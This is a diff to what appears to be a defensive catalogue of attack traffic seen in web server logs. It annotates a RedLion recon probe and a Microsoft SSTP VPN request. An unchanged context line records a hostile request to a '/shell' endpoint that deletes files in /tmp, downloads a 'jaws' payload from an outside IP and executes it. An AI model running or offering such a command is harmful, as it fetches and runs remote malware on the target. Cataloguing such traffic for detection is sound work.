@@ -114,8 +114,7 @@ _________________
 
 Likely: Recon
 
-Recon attempts looking for RedLion automation/manufacturing software systems. 
-https://www.redlion.net/portfolio/secure-remote-access-platform
+Recon attempts looking for RedLion automation/manufacturing software systems. https://www.redlion.net/portfolio/secure-remote-access-platform
 _________________
 GET /shell?cd+/tmp;rm+-rf+*;wget+ 10.1.1.1/jaws;sh+/tmp/jaws
 
@@ -129,8 +128,12 @@ _________________
 
 Likely: Recon
 
-This is a Microsoft SSTP Point to Point traffic request over HTTPS, consistent with RFC 1945, RFC 2616 and RFC 2818. 
+This is a Microsoft SSTP Point to Point traffic request over HTTPS, consistent with RFC 1945, RFC 2616 and RFC 2818. It is used by multiple OSes to create a PPP based VPN through SSTP. 
 
 Example redacted log:
 <155>Aug 11 15:00:00 <REDACTED> apache-access <REDACTED IP> - - [TIMESTAMP] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 2369 "-" "-"
 
+If this succeeds, and there are sufficient ports on the server to accept the new connection, then the server sends back an HTTP_STATUS_OK message to the client. Otherwise, the server fails the request by sending an HTTP error code containing indication this is to be the last data being sent over the connection. 
+
+https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sstp/7e5b2134-b4bf-435a-85bf-bfe0313fd889
+_________________
